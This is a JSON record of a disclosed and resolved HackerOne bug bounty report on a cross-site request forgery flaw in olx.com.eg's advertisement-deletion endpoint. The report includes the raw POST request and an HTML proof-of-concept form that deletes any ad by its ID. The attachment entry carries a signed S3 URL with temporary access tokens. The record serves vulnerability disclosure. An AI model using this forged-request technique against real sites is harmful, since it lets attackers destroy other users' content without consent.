@@ -1,0 +1,120 @@
+{
+  "id": 178384,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzgzODQ=",
+  "url": "https://hackerone.com/reports/178384",
+  "title": "CSRF in delete advertisement on olx.com.eg",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-10-27T12:40:33.639Z",
+  "submitted_at": "2016-10-27T12:40:33.639Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mohamedsherif",
+    "url": "/mohamedsherif",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8146,
+    "url": "https://hackerone.com/olx",
+    "handle": "olx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "OLX",
+      "twitter_handle": "OLX",
+      "website": "http://olx.com",
+      "about": "OLX is an online classifieds platform that enables its users to create ads and display them on social networks."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-05-06T16:55:20.272Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-06T16:55:12.563Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I found a CSRF in the request made while deleting any ad from olx\nthe request sent when deleting any ad is like this\n\nPOST /ajax/myaccount/deactivateme/ HTTP/1.1\nHost: olx.com.eg\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://olx.com.eg/myaccount/\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nContent-Length: 31\nCookie: ... \nConnection: close\n\nadID=106381284&reasonID=4&text=\n\nAs you can see the request doesn't have any protection against CSRF ( no CSRF token ) and to delete any ad you have to only change the \"adID\" with the target id that you can get from the ad page from it's source code\n\nYou can simply inject this request using this POC\n\n<html>\n  <body>\n    <form action=\"https://olx.com.eg/ajax/myaccount/deactivateme/\" method=\"POST\">\n      <input type=\"hidden\" name=\"adID\" value=\"106381284\" />\n      <input type=\"hidden\" name=\"reasonID\" value=\"4\" />\n      <input type=\"hidden\" name=\"text\" value=\"\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\nThis vulnerability can simply allow any hacker to delete all the posts on the website or to leave only his ads on the website so he can sell his products faster\n\nHope you can reply fast because of the severity of the vulnerability",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 130504,
+      "file_name": "csrf.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/130/504/f7089f1dc6747fd64d2fa7037356b43715a9a8a6/csrf.html?response-content-disposition=attachment%3B%20filename%3D%22csrf.html%22%3B%20filename%2A%3DUTF-8%27%27csrf.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6SKXNFL%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBsQY5L%2BFkxRPC58PY5o2r1B4FvJQHizPIG9rlwXtVRvAiAL0D5jMubGIu63HWEEj%2BrlMXD00CwCZl6n%2B2kgNXCz%2BSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIM9fJcytorMyA%2BJcGWKo8FlA6t%2FhW4ihTQDwTO66lwrpmBlh3InHCG7ZNyP57uNt%2FwRHIxvyi6PfiN2yoHKbnj3AHO%2B2d5zoBenUsjkTNVRrSUiifpdaXKnzF7u0bzX9wtP9298ZDuZh%2FGs9ROFHAwwSZO%2BvwKQLvQiKkud03lUkSsYAWSATrr7bzJ1TgRIshBwEoMxF63sGP9s7tsNfzRA%2BRBnErSD0VUQqi0BLoiz8aEpp9YWVfFSARTl85AS70jGdLFyjPSL3p4qQWEPUkiV0yqHhdAEAs09CT1fGjn4y7il2MxOD%2BwERRa3lBGnRAFCEqrktUlGxrk%2BtAvTc%2B7MYBNtBaSu88Qp3FBMeRxgNXuz4B4aE75hNE7hCdKjZkNp653DgLLcvSAVkWXKJ8bc7pY8EMi5I1A2Dl%2BW8ZHS7yWw13MauFUqTfpwfPhg4FrjlzkfofKeir9moM1Qw92DiMAzmXNA9VCWZgtwF9peq7cledMqKMhyz553%2BMG21%2FcYWqw%2FWqRrVoyVdqjqI8FKUBe%2BTS1SxpldVu8xEmCKzbfFzq%2FhT%2FkR7exoQXrx2l%2BL7t%2FuGgGEEKJunLBHXQWh79aKlW4%2FLY1zZRs3z63USsKCdupXOFqYSXN1SfICON%2Fqq6JqRCfisNv890YfHqytS0RRv6qX0n0SN%2BaUeTqSWHqTP0py0ZSVQX4asOO3F%2FAoFXsCcUW8Hln49ICQ0yyR%2Bcv27Gbe2FMzVWYlJHO79Zqq6ItXDPLhetwQl%2BNTdHzqrRFOsB9FNw7KlAliVAd2TMcGOIN3W1R76B95DRHTSvbmbHOhm%2FIFrdcghtBTzYBtLmNwUj6qld3rUi4V7xCIaxjyaDAD3J3BIh9Z56z79Puv7VTgcD1IbaGvCsbkTDaoa2uBjqyAfXgKJ7u1ZqUyaqlA35nJDggYhFUEhgBeS%2FonLnznw%2F8MZgMPwNTg9%2B%2BKneXQRJEmw0IxrRJCtp8dpbLw%2BejfQTVmdG%2FWK%2BDS%2FFX7U1sRmDMc%2FfmYPqycmml%2Bg9esPYXet%2FKlKaaFDXG3gzd7HfWF0%2BL5V0SyxaHdCxSBI4q4kLfNakyjwzmb4ALjzY0fA2TwRp16US2P1dwfWi2GjYsqaNGUOCV0dxXn6CrIbOv%2F%2Bk4ioM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79167966d8ff4b3bb5865d3ed50360288c79892088eeb1d938c2e2a2288a7a4c",
+      "file_size": 418,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-05-06T16:55:12.599Z",
+  "allow_singular_disclosure_after": -213737458.1063994,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "eveeez",
+    "exception",
+    "linkks",
+    "mohamedsherif",
+    "spetr0x",
+    "waldzor"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
